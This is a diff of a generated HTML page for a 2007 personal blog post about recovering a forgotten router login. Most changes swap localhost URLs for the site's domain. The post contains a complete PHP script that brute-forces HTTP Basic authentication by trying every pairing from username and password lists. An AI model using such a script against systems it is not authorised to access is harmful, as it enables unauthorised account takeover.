@@ -7,18 +7,18 @@
 	<title>Hacking into my router by brute-forcing http authentication &middot; Dieter&#39;s blog</title>
 	<link rel="profile" href="http://gmpg.org/xfn/11">
 	<!--[if lt IE 9]>
-	<script src="http://localhost:1313//js/html5.js"></script>
+	<script src="http://dieter.plaetinck.be/js/html5.js"></script>
 	<![endif]-->
     
-    <link href="http://localhost:1313//index.xml" rel="alternate" type="application/rss+xml" title="Dieter&#39;s blog" />
+    <link href="http://dieter.plaetinck.be/index.xml" rel="alternate" type="application/rss+xml" title="Dieter&#39;s blog" />
 
     <link rel='stylesheet' id='twentyfourteen-lato-css'  href='//fonts.googleapis.com/css?family=Lato%3A300%2C400%2C700%2C900%2C300italic%2C400italic%2C700italic&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
 
-    <link rel='stylesheet' id='genericons-css' href='http://localhost:1313//genericons/genericons.css' type='text/css' media='all' />
-	<link rel='stylesheet' id='twentyfourteen-style-css' href='http://localhost:1313//css/style.css' type='text/css' media='all' />
+    <link rel='stylesheet' id='genericons-css' href='http://dieter.plaetinck.be/genericons/genericons.css' type='text/css' media='all' />
+	<link rel='stylesheet' id='twentyfourteen-style-css' href='http://dieter.plaetinck.be/css/style.css' type='text/css' media='all' />
 	
-	<script type='text/javascript' src='http://localhost:1313//js/jquery/jquery.js'></script>
-	<script type='text/javascript' src='http://localhost:1313//js/jquery/jquery-migrate.min.js'></script>
+	<script type='text/javascript' src='http://dieter.plaetinck.be/js/jquery/jquery.js'></script>
+	<script type='text/javascript' src='http://dieter.plaetinck.be/js/jquery/jquery-migrate.min.js'></script>
 	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
 </head>
 
@@ -26,7 +26,7 @@
 <div id="page" class="hfeed site">
 	<header id="masthead" class="site-header" role="banner">
 		<div class="header-main">
-			<h1 class="site-title"><a href="http://localhost:1313//index.html" rel="home">Dieter&#39;s blog</a></h1>
+			<h1 class="site-title"><a href="http://dieter.plaetinck.be" rel="home">Dieter&#39;s blog</a></h1>
 
 			<div class="search-toggle">
 				<a href="#search-container" class="screen-reader-text">Search</a>
@@ -108,11 +108,11 @@
 			</span>
 		</div>
 
-        <h1 class="entry-title"><a href="http://localhost:1313/post/hacking_into_my_router_by_brute_force_http_authentication/">Hacking into my router by brute-forcing http authentication</a></h1>
+        <h1 class="entry-title"><a href="http://dieter.plaetinck.be/post/hacking_into_my_router_by_brute_force_http_authentication/">Hacking into my router by brute-forcing http authentication</a></h1>
 
 		<div class="entry-meta">
 			<span class="entry-date">
-				<a href="http://localhost:1313/post/hacking_into_my_router_by_brute_force_http_authentication/" rel="bookmark">
+				<a href="http://dieter.plaetinck.be/post/hacking_into_my_router_by_brute_force_http_authentication/" rel="bookmark">
 					<time class="entry-date" datetime="2007-11-28 22:11:51 -0400 -0400">
 						November 28, 2007
 					</time>
@@ -124,103 +124,54 @@
 	
 	<div class="entry-content">
 		<p>I forgot the username and password to access the web panel of my router.<br />
-
 Luckily I knew some possible usernames and some patterns that I could have used to construct my password, so I just had to try all the combinations... Too much work to do manually but easily done when scripted.</p>
-
 <p>Here is the php script that I came up with.  (obviously stripped of my personal stuff).  It got my account in less then a second :)<!--more--></p>
-
 <p><strong>DISCLAIMER</strong>:  Don't use this code for anything illegal!  I'm not responsible for what you do with this!</p>
-
 <div class="highlight" style="background: #f8f8f8"><pre style="line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
-
 <span style="color: #19177C">$host</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>;
-
 <span style="color: #19177C">$port</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>;
-
 <span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/&#39;</span>;
-
 <span style="color: #19177C">$users</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>();
-
 <span style="color: #19177C">$passes</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>();
-
 tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$url</span>,<span style="color: #19177C">$port</span>);
-
 <span style="color: #008000; font-weight: bold">foreach</span>(<span style="color: #19177C">$users</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$user</span>) {
-
    <span style="color: #008000; font-weight: bold">foreach</span>(<span style="color: #19177C">$passes</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$pass</span>) {
-
       tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$url</span>,<span style="color: #19177C">$port</span>,<span style="color: #19177C">$user</span>,<span style="color: #19177C">$pass</span>);
-
    }
-
 }
-
-
 
 <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">tryme</span>(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/&#39;</span>,<span style="color: #19177C">$port</span> <span style="color: #666666">=</span> <span style="color: #666666">80</span>, <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>,<span style="color: #19177C">$pass</span> <span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">null</span> ) {
-
    <span style="color: #19177C">$result</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;FAIL&quot;</span>;
-
    <span style="color: #008000; font-weight: bold">if</span>(tryAccess(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$url</span>,<span style="color: #19177C">$port</span>, <span style="color: #19177C">$user</span>,<span style="color: #19177C">$pass</span>)) <span style="color: #19177C">$result</span><span style="color: #666666">=</span><span style="color: #BA2121">&quot;SUCCESS&quot;</span>;
-
    <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$user</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$pass</span>) <span style="color: #19177C">$userpass</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;user </span><span style="color: #BB6688; font-weight: bold">$user</span><span style="color: #BA2121"> pass </span><span style="color: #BB6688; font-weight: bold">$pass</span><span style="color: #BA2121"> &quot;</span>;
-
    <span style="color: #008000; font-weight: bold">else</span> <span style="color: #19177C">$userpass</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot; without username &amp; password&quot;</span>;
-
    <span style="color: #008000; font-weight: bold">echo</span>(<span style="color: #BA2121">&quot;Tried </span><span style="color: #BB6688; font-weight: bold">$userpass</span><span style="color: #BA2121"> &gt; </span><span style="color: #BB6688; font-weight: bold">$result\n</span><span style="color: #BA2121">&quot;</span>);
-
 }
-
-
 
 <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">tryAccess</span>(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/&#39;</span>,<span style="color: #19177C">$port</span> <span style="color: #666666">=</span> <span style="color: #666666">80</span>, <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>,<span style="color: #19177C">$pass</span> <span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">null</span>)  {
-
    <span style="color: #19177C">$fp</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">fsockopen</span> (<span style="color: #19177C">$host</span>, <span style="color: #19177C">$port</span>, <span style="color: #666666">&amp;</span><span style="color: #19177C">$errno</span>, <span style="color: #666666">&amp;</span><span style="color: #19177C">$errdesc</span>);
-
    <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000">is_resource</span> (<span style="color: #19177C">$fp</span>)) {
-
       <span style="color: #008000; font-weight: bold">echo</span>(<span style="color: #BA2121">&quot;Could&#39;t not open socket to server: </span><span style="color: #BB6688; font-weight: bold">$errno</span><span style="color: #BA2121"> - </span><span style="color: #BB6688; font-weight: bold">$errdesc\n</span><span style="color: #BA2121">&quot;</span>);
-
       <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000; font-weight: bold">false</span>;
-
    }
-
    <span style="color: #666666">@</span><span style="color: #008000">fputs</span> (<span style="color: #19177C">$fp</span>, <span style="color: #BA2121">&quot;POST </span><span style="color: #BB6688; font-weight: bold">$url</span><span style="color: #BA2121"> HTTP/1.1</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>);
-
    <span style="color: #666666">@</span><span style="color: #008000">fputs</span> (<span style="color: #19177C">$fp</span>, <span style="color: #BA2121">&quot;Host: </span><span style="color: #BB6688; font-weight: bold">$host\r\n</span><span style="color: #BA2121">&quot;</span>);
-
    <span style="color: #666666">@</span><span style="color: #008000">fputs</span> (<span style="color: #19177C">$fp</span>, <span style="color: #BA2121">&quot;Connection: close</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>);
-
    <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$user</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$pass</span>) {
-
       <span style="color: #666666">@</span><span style="color: #008000">fputs</span> (<span style="color: #19177C">$fp</span>, <span style="color: #BA2121">&quot;Authorization: Basic &quot;</span> <span style="color: #666666">.</span> <span style="color: #008000">base64_encode</span> (<span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$user</span><span style="color: #BA2121">:</span><span style="color: #BB6688; font-weight: bold">$pass</span><span style="color: #BA2121">&quot;</span>) <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>);
-
    }
-
    <span style="color: #666666">@</span><span style="color: #008000">fputs</span>(<span style="color: #19177C">$fp</span>,<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>);
-
         
-
    <span style="color: #19177C">$reply</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>;
-
    <span style="color: #19177C">$success</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">true</span>;
-
    <span style="color: #008000; font-weight: bold">while</span> (<span style="color: #666666">!@</span><span style="color: #008000">feof</span> (<span style="color: #19177C">$fp</span>)) {
-
       <span style="color: #19177C">$line</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">fgets</span> (<span style="color: #19177C">$fp</span>, <span style="color: #666666">1024</span>);
-
       <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">strpos</span>(<span style="color: #19177C">$line</span>,<span style="color: #BA2121">&#39;401 Unauthorized&#39;</span>)) <span style="color: #19177C">$success</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">false</span>;
-
       <span style="color: #19177C">$reply</span> <span style="color: #666666">.=</span> <span style="color: #19177C">$line</span>; 
-
    }
-
    <span style="color: #666666">@</span><span style="color: #008000">fclose</span> (<span style="color: #19177C">$fp</span>);
-
    <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$success</span>;
-
 }
-
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 
@@ -230,7 +181,7 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
 	<footer class="entry-meta">
 		<span class="tag-links">		
 			
-                <a href="http://localhost:1313//tags/php/index.html" rel="tag">php</a>
+                <a href="http://dieter.plaetinck.be/tags/php/index.html" rel="tag">php</a>
             
 		</span>
 	</footer>
@@ -262,13 +213,13 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
     <br/>
 	<h1 class="widget-title">Popular tags</h1>
 
-    <a href="http://localhost:1313/tags/monitoring">monitoring</a>
+    <a href="http://dieter.plaetinck.be/tags/monitoring">monitoring</a>
     24
     <br/>
-    <a href="http://localhost:1313/tags/devops">devops</a>
+    <a href="http://dieter.plaetinck.be/tags/devops">devops</a>
     22
     <br/>
-    <a href="http://localhost:1313/tags/golang">golang</a>
+    <a href="http://dieter.plaetinck.be/tags/golang">golang</a>
     8
     <br/>
     <br/>
@@ -278,31 +229,31 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
 
     
         
-            <a href="http://localhost:1313/tags/arch">arch</a>
+            <a href="http://dieter.plaetinck.be/tags/arch">arch</a>
             19
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/bash">bash</a>
+            <a href="http://dieter.plaetinck.be/tags/bash">bash</a>
             15
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/cakephp">cakephp</a>
+            <a href="http://dieter.plaetinck.be/tags/cakephp">cakephp</a>
             8
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/conf">conf</a>
+            <a href="http://dieter.plaetinck.be/tags/conf">conf</a>
             9
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/dauth">dauth</a>
+            <a href="http://dieter.plaetinck.be/tags/dauth">dauth</a>
             1
             <br/>
         
@@ -311,25 +262,25 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
         
     
         
-            <a href="http://localhost:1313/tags/drums">drums</a>
+            <a href="http://dieter.plaetinck.be/tags/drums">drums</a>
             1
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/drupal">drupal</a>
+            <a href="http://dieter.plaetinck.be/tags/drupal">drupal</a>
             5
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/foss">foss</a>
+            <a href="http://dieter.plaetinck.be/tags/foss">foss</a>
             45
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/git">git</a>
+            <a href="http://dieter.plaetinck.be/tags/git">git</a>
             3
             <br/>
         
@@ -338,31 +289,31 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
         
     
         
-            <a href="http://localhost:1313/tags/information-age">information-age</a>
+            <a href="http://dieter.plaetinck.be/tags/information-age">information-age</a>
             3
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/life">life</a>
+            <a href="http://dieter.plaetinck.be/tags/life">life</a>
             32
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/linux">linux</a>
+            <a href="http://dieter.plaetinck.be/tags/linux">linux</a>
             20
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/lua">lua</a>
+            <a href="http://dieter.plaetinck.be/tags/lua">lua</a>
             1
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/mail">mail</a>
+            <a href="http://dieter.plaetinck.be/tags/mail">mail</a>
             1
             <br/>
         
@@ -371,97 +322,97 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
         
     
         
-            <a href="http://localhost:1313/tags/music">music</a>
+            <a href="http://dieter.plaetinck.be/tags/music">music</a>
             5
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/mysql">mysql</a>
+            <a href="http://dieter.plaetinck.be/tags/mysql">mysql</a>
             3
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/n900">n900</a>
+            <a href="http://dieter.plaetinck.be/tags/n900">n900</a>
             2
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/netlog">netlog</a>
+            <a href="http://dieter.plaetinck.be/tags/netlog">netlog</a>
             6
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/openstack">openstack</a>
+            <a href="http://dieter.plaetinck.be/tags/openstack">openstack</a>
             1
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/perf">perf</a>
+            <a href="http://dieter.plaetinck.be/tags/perf">perf</a>
             10
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/photos">photos</a>
+            <a href="http://dieter.plaetinck.be/tags/photos">photos</a>
             3
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/php">php</a>
+            <a href="http://dieter.plaetinck.be/tags/php">php</a>
             11
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/productivity">productivity</a>
+            <a href="http://dieter.plaetinck.be/tags/productivity">productivity</a>
             6
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/python">python</a>
+            <a href="http://dieter.plaetinck.be/tags/python">python</a>
             5
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/real-life">real-life</a>
+            <a href="http://dieter.plaetinck.be/tags/real-life">real-life</a>
             2
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/thesis">thesis</a>
+            <a href="http://dieter.plaetinck.be/tags/thesis">thesis</a>
             3
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/travel">travel</a>
+            <a href="http://dieter.plaetinck.be/tags/travel">travel</a>
             2
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/uzbl">uzbl</a>
+            <a href="http://dieter.plaetinck.be/tags/uzbl">uzbl</a>
             6
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/vimeo">vimeo</a>
+            <a href="http://dieter.plaetinck.be/tags/vimeo">vimeo</a>
             3
             <br/>
         
     
         
-            <a href="http://localhost:1313/tags/web2.0">web2.0</a>
+            <a href="http://dieter.plaetinck.be/tags/web2.0">web2.0</a>
             9
             <br/>
         
@@ -485,9 +436,6 @@ tryme(<span style="color: #19177C">$host</span>,<span style="color: #19177C">$ur
 		</footer>
 	</div>
 
-	<script type='text/javascript' src='http://localhost:1313//js/functions.js'></script>
-<script>document.write('<script src="http://'
-        + (location.host || 'localhost').split(':')[0]
-		+ ':1313/livereload.js?mindelay=10"></'
-        + 'script>')</script></body>
+	<script type='text/javascript' src='http://dieter.plaetinck.be/js/functions.js'></script>
+</body>
 </html>
